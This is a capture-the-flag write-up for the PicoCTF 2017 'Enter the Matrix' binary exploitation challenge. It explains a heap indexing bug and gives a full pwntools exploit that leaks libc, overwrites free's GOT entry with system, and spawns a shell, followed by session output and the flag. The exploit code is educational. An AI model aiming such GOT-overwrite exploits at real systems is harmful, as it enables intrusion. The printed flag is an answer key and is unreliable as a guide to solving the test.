# PicoCTF_2017: Enter the Matrix

**Category:** Binary Exploitation

**Points:** 150

**Description:**

The Matrix awaits you,. Take the [red pill](https://webshell2017.picoctf.com/static/6a932ca4e0c8977d96dc08b759a6a1aa/matrix) and begin your journey. [Source](https://webshell2017.picoctf.com/static/6a932ca4e0c8977d96dc08b759a6a1aa/matrix.c). Jack in at shell2017.picoctf.com:52501.

**Hint:**

- Look carefully at how the matrix is indexed.
- Study the heap memory layout to see what you can overwrite.

## Write-up
When we have a look at the application, we can see that  `print`  command does not work. I don't know if it was intended, but we can solve the challenge without it.

} else if(2 == sscanf(cmdbuf, "print %d", &id)) {
        handle_print(id);

According to Linux Programmer's Manual  `On success, these functions return the number of input items successfully matched and assigned`, but we have only one parameter (so the function always returns 0 or 1 in this case). We can patch it locally, but unfortunately server also runs version with this bug.

The code isn't too long, so we can analyze it quickly and hopefully find the vulnerability. It appears that vulnerable functions are  `handle_get`  and  `handle_set`.

m->data[r * m->nrows + c] = v;

If number of rows is greater than number of columns we can read/write to arbitrary place in memory. Let's assume 2x3 matrix. It would be printed like this.

```
0 1
2 3
4 5

```

However, if we want to write to  `r=2 c=1`  we'll get  `r * m->nrows + c = 2*3+1=7`. Clearly we accessed the memory after our array.

struct matrix {
    int nrows, ncols;
    float *data;
};

We can create two matrices, one rectangle (number of rows must be greater than number of columns) and second one can be square (it doesn't matter). We'll use first one to overwrite data pointer of the second matrix. Then  `get`  and  `set`  commands will access memory of our choice. We can overwrite some address in  `.got.plt`, but which one is the best? We want to find a function that takes pointer to string we control as first argument.  `handle_command`  and  `free`  are the only function that comply with this requirement (note that there are no types in assembly, so we just need a pointer).  `handle_command`  isn't dynamically loaded, so we can only choose  `free`.

With radare2 on webshell we can obtain offsets we need. (`setbuf`  is first entry in  `.got.plt`)

```
$ r2 /lib32/libc.so.6  
[0x00019bc0]> ?v sym.setbuf
0x6b350
[0x00019bc0]> ?v sym.system
0x3e3e0
```

The last thing we have to do is to create third matrix with our string.

```python
#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack
setbuf_got_plt = 0x0804A104
setbuf_offset = 0x6b350
system_offset = 0x3e3e0
r = remote("shell2017.picoctf.com",19369)
r.send("create 10 5\n")
r.send("create 3 3\n")
r.send("create 2 2\n")
r.send("set 0 5 4 %.9g \n"%(unpack(">f",pack(">I",setbuf_got_plt))[0]))
r.send("get 1 0 0\n")
r.recvuntil("Matrix[0][0] = ")
real_setbuf = unpack(">I",pack(">f",float(r.recvline().strip())))[0]
libc_base = real_setbuf-setbuf_offset
system_addr = libc_base + system_offset
r.send("set 1 0 2 %.9g \n"%(unpack(">f",pack(">I",system_addr))[0]))
r.send("set 2 0 0 %.9g \n"%(unpack("<f","/bin")[0]))
r.send("set 2 0 1 %.9g \n"%(unpack("<f","/sh\x00")[0]))
r.send("destroy 2\n")
r.interactive()
```

If you have problems with floats remember to use  `%.9g`  format, it should allow to represent it unambiguously (when I used  `%f`,  `%g`  or  `%e`  it was encoded differently on server).

```text
$ python matrix.py 
[+] Opening connection to shell2017.picoctf.com on port 52501: Done
[*] Switching to interactive mode
Enter command: Successfully set matrix[0][2] = -4.36863098e+33
Enter command: Successfully set matrix[0][0] = 1.8057176e+28
Enter command: Successfully set matrix[0][1] = 9.59221169e-39
Enter command: $ cat flag.txt
5d19abbdda3886fc91c195c8a3b0d8a1
```

The flag is  `5d19abbdda3886fc91c195c8a3b0d8a1`.
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE3MzgzMDQxMzQsLTExOTkwNzE1NTFdfQ
==
-->